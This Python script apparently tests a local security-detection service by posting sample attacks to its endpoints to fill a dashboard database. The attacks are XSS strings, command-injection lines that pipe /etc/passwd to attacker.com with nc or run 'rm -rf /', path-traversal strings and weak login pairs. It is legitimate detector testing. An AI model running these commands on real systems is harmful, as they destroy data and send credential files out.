"""
Simulation script for Advanced Security Detection
Simulates various security events to populate the database
"""
import requests
import time
import random

def simulate_security_events():
    base_url = "http://127.0.0.1:8000"
    
    print("🧪 Simulating Security Events...")
    print("="*50)
    
    # XSS payloads
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>"
    ]
    
    # Command injection payloads
    cmd_payloads = [
        "ls | cat /etc/passwd",
        "echo 'test' | rm -rf /",
        "ping `whoami`.attacker.com",
        "cat /etc/passwd | nc attacker.com 80",
        "echo 'test' && rm -rf / --no-preserve-root"
    ]
    
    # Path traversal payloads
    path_payloads = [
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..././..././etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd"
    ]
    
    # Authentication attempts
    auth_attempts = [
        {"username": "admin", "password": "123"},
        {"username": "root", "password": "password"},
        {"username": "admin", "password": "admin"},
        {"username": "test", "password": "12345"},
        {"username": "user", "password": "qwerty"}
    ]
    
    total_events = 0
    
    # Simulate XSS events
    print("\n1. Simulating XSS Detection Events...")
    for payload in xss_payloads:
        try:
            response = requests.post(
                f"{base_url}/advanced-security/detect-xss",
                json={"content": payload},
                headers={"Content-Type": "application/json"}
            )
            if response.status_code == 200:
                print(f"   ✅ XSS: {payload[:30]}...")
                total_events += 1
            time.sleep(0.1)  # Small delay
        except Exception as e:
            print(f"   ❌ Error with XSS payload: {e}")
    
    # Simulate Command Injection events
    print("\n2. Simulating Command Injection Events...")
    for payload in cmd_payloads:
        try:
            response = requests.post(
                f"{base_url}/advanced-security/detect-command-injection",
                json={"command": payload},
                headers={"Content-Type": "application/json"}
            )
            if response.status_code == 200:
                print(f"   ✅ CMD: {payload[:30]}...")
                total_events += 1
            time.sleep(0.1)  # Small delay
        except Exception as e:
            print(f"   ❌ Error with CMD payload: {e}")
    
    # Simulate Path Traversal events
    print("\n3. Simulating Path Traversal Events...")
    for payload in path_payloads:
        try:
            response = requests.post(
                f"{base_url}/advanced-security/detect-path-traversal",
                json={"path": payload},
                headers={"Content-Type": "application/json"}
            )
            if response.status_code == 200:
                print(f"   ✅ PATH: {payload[:30]}...")
                total_events += 1
            time.sleep(0.1)  # Small delay
        except Exception as e:
            print(f"   ❌ Error with PATH payload: {e}")
    
    # Simulate Auth Bruteforce events
    print("\n4. Simulating Auth Bruteforce Events...")
    for attempt in auth_attempts:
        try:
            response = requests.post(
                f"{base_url}/advanced-security/detect-auth-bruteforce",
                json=attempt,
                headers={"Content-Type": "application/json"}
            )
            if response.status_code == 200:
                print(f"   ✅ AUTH: {attempt['username']}/{attempt['password']}")
                total_events += 1
            time.sleep(0.1)  # Small delay
        except Exception as e:
            print(f"   ❌ Error with AUTH payload: {e}")
    
    # Test database functionality
    print("\n5. Verifying Database Storage...")
    try:
        response = requests.get(f"{base_url}/advanced-security/recent-detections?limit=20")
        if response.status_code == 200:
            data = response.json()
            print(f"   ✅ Retrieved {data['total']} stored detections from database")
            
            # Show a few examples
            if data['detections']:
                print("   Latest detections:")
                for i, detection in enumerate(data['detections'][:3]):
                    print(f"     - {detection['threat_type']}: {detection['severity']} "
                          f"({detection['confidence']:.2f})")
        else:
            print(f"   ❌ Failed to retrieve detections: {response.status_code}")
    except Exception as e:
        print(f"   ❌ Error retrieving detections: {e}")
    
    print(f"\n🎯 Simulation Complete! {total_events} security events processed and stored in database.")
    print("The Advanced Security Dashboard now has historical data to display.")


if __name__ == "__main__":
    time.sleep(2)  # Ensure server is ready
    simulate_security_events()